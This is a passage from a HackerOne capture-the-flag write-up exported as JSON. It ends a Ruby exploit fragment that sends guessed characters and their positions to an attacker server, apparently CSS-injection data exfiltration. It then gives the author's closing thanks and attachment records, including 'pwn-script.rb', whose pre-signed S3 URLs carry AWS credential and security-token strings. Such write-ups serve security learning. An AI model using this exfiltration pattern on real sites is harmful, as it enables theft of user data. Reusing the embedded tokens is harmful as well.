class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003eserver\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/?char=\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;index=\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;);}\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis took...a few tries but finally I managed to grab the right code and....\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2020-06-01_at_3.02.29_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pZRLWtqTYpYt4ra94Jh2NPi8?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_3.02.29_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_3.02.29_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=16d56374850aae44e2d920abe78a3439fd700e1b6d800a9dbccc5648300184d6\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pZRLWtqTYpYt4ra94Jh2NPi8?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_3.02.29_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_3.02.29_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=16d56374850aae44e2d920abe78a3439fd700e1b6d800a9dbccc5648300184d6\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"thoughts\"\u003eThoughts\u003c/h3\u003e\n\n\u003cp\u003eI just want to say thank you to H1 and everyone involved in making these challenges, my first one was back in 2018 for DefCon, and I failed miserably. I told myself I would give it my best and I think I did just that. As always awesome challenge - I walked away with some new knowledge and more appreciation for css ðŸ¦†. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-07T01:57:24.907Z","updated_at":"2020-06-07T01:57:24.907Z","actor":{"username":"pirateducky","cleared":false,"url":"/pirateducky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":857599,"filename":"Screen_Shot_2020-06-01_at_7.28.31_AM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/emrHgwaZ5eaKghdsemMuZfUp?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_7.28.31_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_7.28.31_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=d9b21732c22eba93a5107411d0477f4b1abe2fbd4294930e9610e2df36909ba3"},{"id":857598,"filename":"pwn-script.rb","type":"text/x-ruby-script","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RAdK9JgLxkJPETmEn129s2g4?response-content-disposition=attachment%3B%20filename%3D%22pwn-script.rb%22%3B%20filename%2A%3DUTF-8%27%27pwn-script.rb\u0026response-content-type=text%2Fx-ruby-script\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=ca1e42218a7b28715b50dba75ba0e827483f005188abfc38f6494c77ff97f15f"},{"id":857595,"filename":"Screen_Shot_2020-06-01_at_3.02.29_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pZRLWtqTYpYt4ra94Jh2NPi8?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_3.02.29_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_3.02.29_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=16d56374850aae44e2d920abe78a3439fd700e1b6d800a9dbccc5648300184d6"},{"id":857593,"filename":"Screen_Shot_2020-06-01_at_2.00.51_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bDZftEAbZj2R1ZXxByCJtMcT?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_2.00.51_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_2.00.51_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=7f3b7fd25d1bb86467cba0f90b052d029c69724e549dd27f043f034225ed61d3"},{"id":857592,"filename":"Screen_Shot_2020-06-01_at_1.44.46_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RLjjuE1RCvaNtAC7r8c48UZk?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_1.44.46_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_1.44.46_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=e672bb47949531c6b7803185c3c889efade356ff0b5066707e2f39dba17c32ca"},{"id":857591,"filename":"Screen_Shot_2020-06-01_at_11.31.24_AM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tFwXeWDijqRAbC6nFdFunTyB?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_11.31.24_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_11.31.24_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=dacb809725ec0b4585fc3e0ad3206e253634ed865b5f23b43cea0078b695185b"},{"id":857590,"filename":"Screen_Shot_2020-06-01_at_11.18.46_AM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/G3eYoRYmN25hEwK6wkBgphoW?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_11.18.46_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_11.18.46_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=2e5b493ff51fe95e2666a4cfb6e7fe4c096df20376668b3e9ebcb0c1ac57dc3d"},{"id":857589,"filename":"Screen_Shot_2020-06-01_at_5.29.03_PM.png","type":"image/png","url":"https://hackerone-us